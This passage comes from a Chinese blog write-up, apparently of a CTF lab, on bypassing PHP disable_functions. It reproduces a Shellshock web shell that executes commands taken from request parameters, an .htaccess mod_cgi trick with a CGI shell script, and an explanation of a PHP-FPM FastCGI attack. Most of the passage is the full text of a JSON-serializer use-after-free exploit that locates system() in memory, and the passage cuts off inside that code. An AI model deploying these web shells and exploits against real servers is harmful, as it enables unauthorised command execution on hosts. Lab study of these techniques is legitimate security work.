dirname($_SERVER["SCRIPT_FILENAME"]);</span><br><span class="line">  if(substr($d, 0, 1) == "/" &amp;&amp; function_exists('putenv') &amp;&amp; (function_exists('error_log') || function_exists('mail'))){</span><br><span class="line">    if(strstr(readlink("/bin/sh"), "bash")!=FALSE){</span><br><span class="line">      $tmp=tempnam(sys_get_temp_dir(), 'as');</span><br><span class="line">      putenv("PHP_LOL=() { x; }; $c &gt;$tmp 2&gt;&amp;1");</span><br><span class="line">      if (function_exists('error_log')) {</span><br><span class="line">        error_log("a", 1);</span><br><span class="line">      }else{</span><br><span class="line">        mail("a@127.0.0.1", "", "", "-bv");</span><br><span class="line">      }</span><br><span class="line">    }else{</span><br><span class="line">      print("Not vuln (not bash)\n");</span><br><span class="line">    }</span><br><span class="line">    $output = @file_get_contents($tmp);</span><br><span class="line">    @unlink($tmp);</span><br><span class="line">    if($output!=""){</span><br><span class="line">      print($output);</span><br><span class="line">    }else{</span><br><span class="line">      print("No output, or not vuln.");</span><br><span class="line">    }</span><br><span class="line">  }else{</span><br><span class="line">    print("不满足使用条件");</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">// runcmd("whoami"); // 要执行的命令</span><br><span class="line">runcmd($_REQUEST["cmd"]); // ?cmd=whoami</span><br><span class="line">?&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>还是直接上传到antsword中，然后直接访问这个文件就可以了</p>
<p>效果如下</p>
<p><img src="/images/Snipaste_2025-04-27_20-44-55.png"></p>
<p>第三个脚本</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span><br><span class="line"># Google Dork: none </span><br><span class="line"># Date: 10/31/2014 </span><br><span class="line"># Exploit Author: Ryan King (Starfall) </span><br><span class="line"># Vendor Homepage: http://php.net </span><br><span class="line"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror </span><br><span class="line"># Version: 5.* (tested on 5.6.2) </span><br><span class="line"># Tested on: Debian 7 and CentOS 5 and 6 </span><br><span class="line"># CVE: CVE-2014-6271 </span><br><span class="line"></span><br><span class="line">function shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail.c:283 </span><br><span class="line">   $tmp = tempnam(".","data"); </span><br><span class="line">   putenv("PHP_LOL=() { x; }; $cmd &gt;$tmp 2&gt;&amp;1"); </span><br><span class="line">   // In Safe Mode, the user may only alter environment variableswhose names </span><br><span class="line">   // begin with the prefixes supplied by this directive. </span><br><span class="line">   // By default, users will only be able to set environment variablesthat </span><br><span class="line">   // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, </span><br><span class="line">   // PHP will let the user modify ANY environment variable! </span><br><span class="line">   mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actuallysend any mail</span><br><span class="line">   error_log('a',1);</span><br><span class="line">   $output = @file_get_contents($tmp); </span><br><span class="line">   @unlink($tmp); </span><br><span class="line">   if($output != "") return $output; </span><br><span class="line">   else return "No output, or not vuln."; </span><br><span class="line">} </span><br><span class="line">echo shellshock($_REQUEST["cmd"]); </span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>依旧是直接访问即可，效果如下</p>
<p><img src="/images/Snipaste_2025-04-27_20-47-25.png"></p>
<p>注意，直接使用cat等命令还是无法查看，必须要使用类似于tac等能suid提权的命令</p>
<h5 id="利用-Apache-Mod-CGI"><a href="/2025/04/25/%E7%BB%95%E8%BF%87disable-function%E7%9A%84%E9%99%90%E5%88%B6/#利用-Apache-Mod-CGI" class="headerlink" title="利用 Apache Mod CGI"></a>利用 Apache Mod CGI</h5><p>具体走一遍流程吧，蚁剑连接<del>，打开终端</del>，执行命令<del>，欸</del>，执行不了欸~</p>
<p><img src="/images/Snipaste_2025-04-27_21-03-37.png"></p>
<p>这里大概给个解释</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CGI：</span><br><span class="line">CGI简单说来便是放在服务器上的可执行程序,CGI编程没有特定的语言,C语言,linux shell,perl,vb等等都可以进行CGI编程.</span><br><span class="line">MOD_CGI：</span><br><span class="line">任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中.</span><br></pre></td></tr></tbody></table></figure>

<p>能用蚁剑连，但是/flag 这个文件是 644 权限，www-data （write-write-write)用户无法通过读文件的形式读到内容, 需要执行拥有 SUID 权限的 tac 命令(具体看 /start.sh)来获取 flag</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">使用「绕过 disable_functions」插件, 选择 Apache_mod_cgi 模式进行</span><br><span class="line"></span><br><span class="line">使用条件</span><br><span class="line"></span><br><span class="line">必须是apache环境</span><br><span class="line">mod_cgi已经启用</span><br><span class="line">必须允许.htaccess文件，也就是说在httpd.conf中，要注意AllowOverride选项为All，而不是none</span><br><span class="line">必须有权限写.htaccess文件</span><br></pre></td></tr></tbody></table></figure>

<p>点击开始按钮之后会直接打开一个新的终端，能直接执行命令了</p>
<p><img src="/images/image-20250427210757133.png"></p>
<p><strong>手工</strong></p>
<p>其实原理就是利用.htaccess</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</span><br><span class="line"></span><br><span class="line">如果.htaccess文件被攻击者修改的话，攻击者就可以利用apache的mod_cgi模块，直接绕过PHP的任何限制，来执行系统命令。</span><br><span class="line">这里的.htaccess文件，将所有.ant后缀的文件作为cgi脚本执行</span><br><span class="line"></span><br><span class="line">Options +ExecCGI #表示允许CGI执行，如果AllowOverride只有FileInfo权限且本身就开启了ExecCGI的话，就可以不需要这句话了</span><br><span class="line">AddHandler cgi-script .ant #告诉Apache将xx后缀名的文件当作CGI程序进行解析</span><br></pre></td></tr></tbody></table></figure>

<p>再写一个shell.ant文件</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#! /bin/sh</span><br><span class="line">echo&amp;&amp;cd "/var/www/html/backdoor";tac /flag;</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/Snipaste_2025-04-27_21-12-19.png"></p>
<p>然后直接访问shell.ant就可以直接执行命令了，改改htaccess文件，什么后缀都可以被当作chi程序解析，但是也是有使用条件的</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用条件</span><br><span class="line"></span><br><span class="line">必须是apache环境</span><br><span class="line">mod_cgi已经启用</span><br><span class="line">必须允许.htaccess文件，也就是说在httpd.conf中，要注意AllowOverride选项为All，而不是none</span><br><span class="line">必须有权限写.htaccess文件</span><br></pre></td></tr></tbody></table></figure>

<h5 id="PHP-FPM-利用-LD-PRELOAD"><a href="/2025/04/25/%E7%BB%95%E8%BF%87disable-function%E7%9A%84%E9%99%90%E5%88%B6/#PHP-FPM-利用-LD-PRELOAD" class="headerlink" title="PHP-FPM 利用 LD_PRELOAD"></a>PHP-FPM 利用 LD_PRELOAD</h5><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">正常情况下, PHP-FPM 是不会对外开放的。在有 webshell 之后，这就变得不一样了。学习通过攻击 PHP-FPM 达到 Bypass 的目的。</span><br></pre></td></tr></tbody></table></figure>

<p>前提知识：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php-fpm即php-Fastcgi Process Manager.</span><br><span class="line">php-fpm是 FastCGI 的实现，并提供了进程管理的功能。</span><br><span class="line">进程包含 master 进程和 worker 进程两种进程。</span><br><span class="line">master 进程只有一个，负责监听端口，接收来自 Web Server 的请求，而 worker 进程则一般有多个(具体数量根据实际需要配置)，每个进程内部都嵌入了一个 PHP 解释器，是 PHP 代码真正执行的地方。</span><br></pre></td></tr></tbody></table></figure>

<p>总结来说php-fpm是一个fastcgi协议解析器，负责按照fastcgi的协议将TCP流解析成真正的数据</p>
<p>PHP-FPM默认监听9000端口，我们可以自己构造fastcgi协议，和fpm进行通信。于是就有了利用 WebShell 直接与 PHP FastCGI (FPM) 来实现Bypass Disable Functions</p>
<p>额，具体的流程还是那样，就不过多赘述了，我们直接使用antsword直接绕过吧</p>
<p>连接蚁剑，使用插件模式选择Fastcgi/PHP-FPM</p>
<p>注意该模式下需要选择 PHP-FPM 的接口地址, 需要自行找配置文件查 FPM 接口地址, 默认的是 unix:/// 本地 socket 这种的,如果配置成 TCP 的默认是 127.0.0.1:9000，一般默认都是9000端口</p>
<p><img src="/images/Snipaste_2025-04-27_21-32-30.png"></p>
<p>直接连接这个php文件，密码还是ant</p>
<p><img src="/images/Snipaste_2025-04-27_21-33-43.png"></p>
<p>本例中没有禁止 <code>putenv</code>, 可以用 <code>LD_PRELOAD</code>完成命令执行</p>
<p>具体操作与 第一个相同, 不再缀述</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">一些疑问和解答</span><br><span class="line">这里由于FPM默认监听的是9000端口,我们就可以绕过webserver,直接构造fastcgi协议，和fpm进行通信.于是就有了利用 webshell 直接与 FPM通信 来绕过 disable functions.</span><br><span class="line">因为前面我们了解了协议原理和内容,接下来就是使用cgi协议封装请求,通过socket来直接与FPM通信</span><br><span class="line">但是能够构造fastcgi，就能执行任意PHP代码吗?答案是肯定的,但是前提是我们需要突破几个限制：</span><br><span class="line">1.第一个问题</span><br><span class="line">既然是请求,那么SCRIPT_FILENAME就相当的重要,因为前面说过,fpm是根据这个值来执行php文件文件的,如果不存在,会直接返回404,所以想要利用好这个漏洞,就得找到一个已经存在的php文件,好在一般进行源安装php的时候,服务器都会附带上一些php文件,如果说我们没有收集到目标web目录的信息的话,可以试试这种办法.</span><br><span class="line">2.第二个问题</span><br><span class="line">我们再如何构造fastcgi和控制SCRIPT_FILENAME,都无法做到任意命令执行,因为只能执行目标服务器上的php文件.</span><br><span class="line">那要如何绕过这种限制呢? 我们可以从php.ini入手.它有两个特殊选项,能够让我们去做到任意命令执行,那就是auto_prepend_file</span><br><span class="line">auto_prepend_file的功能是在在执行目标文件之前，先包含它指定的文件,这样的话,就可以用它来指定php://input进行远程文件包含了.这样就可以做到任意命令执行了.</span><br><span class="line">3.第三个问题</span><br><span class="line">进行过远程文件包含的小伙伴都知道,远程文件包含有allow_url_include这个限制因素的,如果没有为ON的话就没有办法进行远程文件包含,那要怎末设置呢?</span><br><span class="line">这里,FPM是有设置PHP配置项的KEY-VALUE的,PHP_VALUE可以用来设置php.ini,PHP_ADMIN_VALUE则可以设置所有选项.这样就解决问题了</span><br></pre></td></tr></tbody></table></figure>

<p>第五关还是和第四关一样，都是利用fastcgi攻击php-fpm</p>
<p>不过多赘述</p>
<h5 id="Json-Serizlizer-UAF"><a href="/2025/04/25/%E7%BB%95%E8%BF%87disable-function%E7%9A%84%E9%99%90%E5%88%B6/#Json-Serizlizer-UAF" class="headerlink" title="Json Serizlizer UAF"></a>Json Serizlizer UAF</h5><p>利用json序列化中的堆溢出触发，借此绕过限制，影响范围是:<br>7.1 – all versions to date<br>7.2 &lt; 7.2.19 (released: 30 May 2019)<br>7.3 &lt; 7.3.6 (released: 30 May 2019)</p>
<p><strong>手工</strong></p>
<p>本人纯脚本小子，就直接用网上找到的脚本打了，exp地址：<a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php</a></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"># Author: https://github.com/mm0r1</span><br><span class="line"></span><br><span class="line">$cmd = $_POST["pass"];</span><br><span class="line"></span><br><span class="line">$n_alloc = 10; # increase this value if you get segfaults</span><br><span class="line"></span><br><span class="line">class MySplFixedArray extends SplFixedArray {</span><br><span class="line">    public static $leak;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">class Z implements JsonSerializable {</span><br><span class="line">    public function write(&amp;$str, $p, $v, $n = 8) {</span><br><span class="line">      $i = 0;</span><br><span class="line">      for($i = 0; $i &lt; $n; $i++) {</span><br><span class="line">        $str[$p + $i] = chr($v &amp; 0xff);</span><br><span class="line">        $v &gt;&gt;= 8;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public function str2ptr(&amp;$str, $p = 0, $s = 8) {</span><br><span class="line">        $address = 0;</span><br><span class="line">        for($j = $s-1; $j &gt;= 0; $j--) {</span><br><span class="line">            $address &lt;&lt;= 8;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        }</span><br><span class="line">        return $address;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public function ptr2str($ptr, $m = 8) {</span><br><span class="line">        $out = "";</span><br><span class="line">        for ($i=0; $i &lt; $m; $i++) {</span><br><span class="line">            $out .= chr($ptr &amp; 0xff);</span><br><span class="line">            $ptr &gt;&gt;= 8;</span><br><span class="line">        }</span><br><span class="line">        return $out;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    # unable to leak ro segments</span><br><span class="line">    public function leak1($addr) {</span><br><span class="line">        global $spl1;</span><br><span class="line"></span><br><span class="line">        $this-&gt;write($this-&gt;abc, 8, $addr - 0x10);</span><br><span class="line">        return strlen(get_class($spl1));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    # the real deal</span><br><span class="line">    public function leak2($addr, $p = 0, $s = 8) {</span><br><span class="line">        global $spl1, $fake_tbl_off;</span><br><span class="line"></span><br><span class="line">        # fake reference zval</span><br><span class="line">        $this-&gt;write($this-&gt;abc, $fake_tbl_off + 0x10, 0xdeadbeef); # gc_refcounted</span><br><span class="line">        $this-&gt;write($this-&gt;abc, $fake_tbl_off + 0x18, $addr + $p - 0x10); # zval</span><br><span class="line">        $this-&gt;write($this-&gt;abc, $fake_tbl_off + 0x20, 6); # type (string)</span><br><span class="line"></span><br><span class="line">        $leak = strlen($spl1::$leak);</span><br><span class="line">        if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; }</span><br><span class="line"></span><br><span class="line">        return $leak;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public function parse_elf($base) {</span><br><span class="line">        $e_type = $this-&gt;leak2($base, 0x10, 2);</span><br><span class="line"></span><br><span class="line">        $e_phoff = $this-&gt;leak2($base, 0x20);</span><br><span class="line">        $e_phentsize = $this-&gt;leak2($base, 0x36, 2);</span><br><span class="line">        $e_phnum = $this-&gt;leak2($base, 0x38, 2);</span><br><span class="line"></span><br><span class="line">        for($i = 0; $i &lt; $e_phnum; $i++) {</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = $this-&gt;leak2($header, 0, 4);</span><br><span class="line">            $p_flags = $this-&gt;leak2($header, 4, 4);</span><br><span class="line">            $p_vaddr = $this-&gt;leak2($header, 0x10);</span><br><span class="line">            $p_memsz = $this-&gt;leak2($header, 0x28);</span><br><span class="line"></span><br><span class="line">            if($p_type == 1 &amp;&amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write</span><br><span class="line">                # handle pie</span><br><span class="line">                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            } else if($p_type == 1 &amp;&amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec</span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        if(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            return false;</span><br><span class="line"></span><br><span class="line">        return [$data_addr, $text_size, $data_size];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public function get_basic_funcs($base, $elf) {</span><br><span class="line">        list($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        for($i = 0; $i &lt; $data_size / 8; $i++) {</span><br><span class="line">            $leak = $this-&gt;leak2($data_addr, $i * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {</span><br><span class="line">                $deref = $this-&gt;leak2($leak);</span><br><span class="line">                # 'constant' constant check</span><br><span class="line">                if($deref != 0x746e6174736e6f63)</span><br><span class="line">                    continue;</span><br><span class="line">            } else continue;</span><br><span class="line"></span><br><span class="line">            $leak = $this-&gt;leak2($data_addr, ($i + 4) * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {</span><br><span class="line">                $deref = $this-&gt;leak2($leak);</span><br><span class="line">                # 'bin2hex' constant check</span><br><span class="line">                if($deref != 0x786568326e6962)</span><br><span class="line">                    continue;</span><br><span class="line">            } else continue;</span><br><span class="line"></span><br><span class="line">            return $data_addr + $i * 8;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public function get_binary_base($binary_leak) {</span><br><span class="line">        $base = 0;</span><br><span class="line">        $start = $binary_leak &amp; 0xfffffffffffff000;</span><br><span class="line">        for($i = 0; $i &lt; 0x1000; $i++) {</span><br><span class="line">            $addr = $start - 0x1000 * $i;</span><br><span class="line">            $leak = $this-&gt;leak2($addr, 0, 7);</span><br><span class="line">            if($leak == 0x10102464c457f) { # ELF header</span><br><span class="line">                return $addr;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public function get_system($basic_funcs) {</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        do {</span><br><span class="line">            $f_entry = $this-&gt;leak2($addr);</span><br><span class="line">            $f_name = $this-&gt;leak2($f_entry, 0, 6);</span><br><span class="line"></span><br><span class="line">            if($f_name == 0x6d6574737973) { # system</span><br><span class="line">                return $this-&gt;leak2($addr + 8);</span><br><span class="line">            }</span><br><span class="line">            $addr += 0x20;</span><br><span class="line">        } while($f_entry != 0);</span><br><span class="line">        return false;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public function jsonSerialize() {</span><br><span class="line">        global $y, $cmd, $spl1, $fake_tbl_off, $n_alloc;</span><br><span class="line"></span><br><span class="line">        $contiguous = [];</span><br><span class="line">        for($i = 0; $i &lt; $n_alloc; $i++)</span><br><span class="line">            $contiguous[] = new DateInterval('PT1S');</span><br><span class="line"></span><br><span class="line">        $room = [];</span><br><span class="line">        for($i = 0; $i &lt; $n_alloc; $i++)</span><br><span class="line">            $room[] = new Z();</span><br><span class="line"></span><br><span class="line">        $_protector = $this-&gt;ptr2str(0, 78);</span><br><span class="line"></span><br><span class="line">        $this-&gt;abc = $this-&gt;ptr2str(0, 79);</span><br><span class="line">        $p = new DateInterval('PT1S');</span><br><span class="line"></span><br><span class="line">        unset($y[0]);</span><br><span class="line">        unset($p);</span><br><span class="line"></span><br><span class="line">        $protector = ".$_protector";</span><br><span class="line"></span><br><span class="line">        $x = new DateInterval('PT1S');</span><br><span class="line">        $x-&gt;d = 0x2000;</span><br><span class="line">        $x-&gt;h = 0xdeadbeef;</span><br><span class="line">        # $this-&gt;abc is now of size 0x2000</span><br><span class="line"></span><br><span class="line">        if($this-&gt;str2ptr($this-&gt;abc) != 0xdeadbeef) {</span><br><span class="line">            die('UAF failed.');</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        $spl1 = new MySplFixedArray();</span><br><span class="line">        $spl2 = new MySplFixedArray();</span><br><span class="line"></span><br><span class="line">        # some leaks</span><br><span class="line">        $class_entry = $this-&gt;str2ptr($this-&gt;abc, 0x120);</span><br><span class="line">        $handlers = $this-&gt;str2ptr($this-&gt;abc, 0x128);</span><br><span class="line">        $php_heap = $this-&gt;str2ptr($this-&gt;abc, 0x1a8);</span><br><span class="line">        $abc_addr = $php_heap - 0x218;</span><br><span class="line"></span><br><span class="line">        # create a fake class_entry</span><br><span class="line">        $fake_obj = $abc_addr;</span><br><span class="line">        $this-&gt;write($this-&gt;abc, 0, 2); # type</span><br><span class="line">        $this-&gt;write($this-&gt;abc, 0x120, $abc_addr); # fake class_entry</span><br><span class="line"></span><br><span class="line">        # copy some of class_entry definition</span><br><span class="line">        for($i = 0; $i &lt; 16; $i++) {</span><br><span class="line">            $this-&gt;write($this-&gt;abc, 0x10 + $i * 8, </span><br><span class="line">                $this-&gt;leak1($class_entry + 0x10 + $i * 8));</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        # fake static members table</span><br><span class="line">        $fake_tbl_off = 0x70 * 4 - 16;</span><br><span class="line">        $this-&gt;write($this-&gt;abc, 0x30, $abc_addr + $fake_tbl_off);</span><br><span class="line">        $this-&gt;write($this-&gt;abc, 0x38, $abc_addr + $fake_tbl_off);</span><br><span class="line"></span><br><span class="line">        # fake zval_reference</span><br><span class="line">        $this-&gt;write($this-&gt;abc, $fake_tbl_off, $abc_addr + $fake_tbl_off + 0x10); # zval</span><br><span class="line">        $this-&gt;write($this-&gt;abc, $fake_tbl_off + 8, 10); # zval type (reference)</span><br><span class="line"></span><br><span class="line">        # look for binary base</span><br><span class="line">        $binary_leak = $this-&gt;leak2($handlers + 0x10);</span><br><span class="line">        if(!($base = $this-&gt;get_binary_base($binary_leak))) {</span><br><span class="line">            die("Couldn't determine binary base address");</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        # parse elf header</span><br><span class="line">        if(!($elf = $this-&gt;parse_elf($base))) {</span><br><span class="line">            die("Couldn't parse ELF");</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        # get basic_functions address</span><br><span class="line">        if(!($basic_funcs = $this-&gt;get_basic_funcs($base, $elf))) {</span><br><span class="line">            die("Couldn't get basic_functions address");</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        # find system entry</span><br><span class="line">        if(!($zif_system = $this-&gt;get_system($basic_funcs))) {</span><br><span class="line">            die("Couldn't get zif_system address");</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        # copy 